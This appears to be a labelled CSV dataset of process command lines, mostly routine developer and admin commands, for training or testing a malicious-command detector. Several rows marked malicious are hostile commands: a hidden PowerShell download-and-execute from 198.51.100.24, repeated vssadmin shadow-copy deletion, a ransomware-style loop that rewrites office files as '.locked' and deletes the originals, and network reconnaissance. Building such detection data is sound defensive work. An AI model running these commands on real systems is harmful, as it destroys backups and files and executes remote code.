process_name,command_line,label
bash,bash -lc 'cd ~/projects/api && git status',benign
psql,"psql -h localhost -U postgres -d appdb -c ""SELECT NOW();""",benign
ping,ping -c 4 8.8.8.8,benign
cmd.exe,"cmd.exe /c wmic logicaldisk get caption,freespace,size,volumename",malicious
zsh,zsh -lc 'source ~/.zshrc && alias',benign
terraform,terraform fmt -recursive,benign
tasklist.exe,tasklist.exe /v,benign
top,top -b -n 1,benign
powershell.exe,"powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""$u='http://198.51.100.24/update.ps1';$p='$env:TEMP\update.ps1';Invoke-WebRequest -UseBasicParsing -Uri $u -OutFile $p;powershell.exe -ExecutionPolicy Bypass -File $p""",malicious
apt-get,sudo apt-get install -y jq,benign
net.exe,net.exe user,benign
diff,diff -u config.old.yml config.yml,benign
service,service ssh status,benign
sleep,sleep 5,benign
black,black src tests,benign
npm,npm run lint,benign
go,go mod tidy,benign
mypy,mypy src,benign
awk,"awk -F, '{print $1}' users.csv | sort | uniq",benign
printenv,printenv PATH,benign
kubectl,kubectl logs deployment/api --tail=50 -n staging,benign
tmux,tmux new-session -s deploy,benign
git,git add src/auth/login.js package.json,benign
git,git checkout -b feature/login-form,benign
gdb,gdb --args python app.py --debug,benign
at,"echo ""sh /home/user/scripts/cleanup.sh"" | at 23:00",benign
umount,sudo umount /mnt/usb,benign
tail,tail -f /var/log/syslog,benign
rsync,rsync -avz ~/site/ deploy@web01.example.net:/var/www/site/,benign
vssadmin.exe,vssadmin.exe Delete Shadows /All /Quiet,malicious
node.exe,node.exe .\dist\server.js,benign
systemctl,systemctl status nginx,benign
id,id,benign
cmd.exe,cmd.exe /c net view \\fileserver,malicious
make,make clean all,benign
mongosh,"mongosh mongodb://localhost:27017/admin --eval ""db.serverStatus().ok""",benign
ip,ip addr show,benign
powershell.exe,"powershell.exe -NoProfile -Command ""Get-Process | Sort-Object CPU -Descending | Select-Object -First 10""",benign
docker,docker images,benign
dotnet,dotnet build MyApp.sln,benign
snap,snap list,benign
powershell.exe,"powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""Get-ChildItem 'C:\Users','D:\','\\fileserver\shares' -Recurse -File -Include *.doc,*.docx,*.xls,*.xlsx,*.ppt,*.pptx,*.pdf | ForEach-Object { $b=[IO.File]::ReadAllBytes($_.FullName); [IO.File]::WriteAllBytes($_.FullName + '.locked',$b); Remove-Item $_.FullName -Force }""",malicious
env,env | sort,benign
npm.cmd,npm.cmd run start,benign
kubectl,kubectl describe deployment web -n prod,benign
terraform,terraform init,benign
go,go test ./...,benign
java,java -jar build/libs/app.jar --spring.profiles.active=dev,benign
htop,htop,benign
node,node server.js --port 3000,benign
cp,cp .env.example .env,benign
vssadmin.exe,vssadmin.exe Delete Shadows /All /Quiet,malicious
vim,vim ~/.bashrc,benign
chown,sudo chown -R www-data:www-data /var/www/html,benign
py.exe,py.exe -3 -m pytest tests\unit -q,benign
npm,npm run build,benign
vssadmin.exe,vssadmin.exe delete shadows /all /quiet,malicious
terraform,terraform plan -out=tfplan,benign
cargo,cargo test,benign
xargs,"find logs -name ""*.gz"" | xargs -n1 gzip -d",benign
javac,javac -d out src/com/example/App.java,benign
flake8,flake8 src tests,benign
npx,npx eslint src --fix,benign
grep,"grep -R ""TODO"" src/",benign
rustc,rustc --version,benign
python,python manage.py runserver 0.0.0.0:8000,benign
rm,rm -f /tmp/app-cache.json,benign
mount,mount | grep /dev/sda1,benign
whoami.exe,whoami.exe /all,benign
curl,curl -s https://api.github.com/repos/nodejs/node | jq '.stargazers_count',benign
date,date '+%Y-%m-%d %H:%M:%S',benign
helm,helm upgrade --install metrics-server metrics-server/metrics-server -n kube-system,benign
cat,cat /etc/os-release,benign
diskutil,diskutil list,benign
kubectl,kubectl get pods -n default,benign
systemctl,sudo systemctl restart docker,benign
npm,npm run dev,benign
zip,zip -r screenshots.zip ~/Pictures/Screenshots,benign
ssh,ssh devops@web01.example.net,benign
python,python scripts/seed_demo_data.py --env dev,benign
chmod,chmod +x scripts/deploy.sh,benign
